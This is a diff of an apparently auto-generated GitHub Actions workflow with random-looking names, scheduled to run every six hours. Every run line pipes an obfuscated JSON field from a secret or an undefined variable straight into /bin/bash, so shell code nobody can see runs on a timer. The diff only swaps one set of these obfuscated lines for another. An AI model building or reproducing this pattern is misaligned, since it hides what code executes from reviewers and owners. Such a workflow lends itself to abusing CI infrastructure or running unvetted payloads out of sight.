@@ -1,23 +1,20 @@
 name: xuewanche7568
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
-
-jobs:  # 24702
+    - cron: '53 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xuewanche7568
         env:
-          fmbx8039: ${{ secrets.fmbx8039 }}
+          pd81: ${{ secrets.pd81 }}
         run: |
-          echo $fmbx8039 | jq -r .pqdsi0090 | /bin/bash
-          echo $qxzxt95593 | jq -r .zist202 | /bin/bash
-          echo $jszm8496 | jq -r .zq06 | /bin/bash
-          echo $yha24960 | jq -r .wlkk0932 | /bin/bash
-          echo $usu62389 | jq -r .ll94 | /bin/bash
-          echo $bkld5547 | jq -r .rhawa59 | /bin/bash
+          echo $pd81 | jq -r .az9019 | /bin/bash
+          echo $mij53915 | jq -r .mttcu986 | /bin/bash
+          echo $jn3555 | jq -r .idcl0 | /bin/bash
+          echo $vjxc08 | jq -r .ll609 | /bin/bash
+          echo $lt061 | jq -r .c31853 | /bin/bash
 
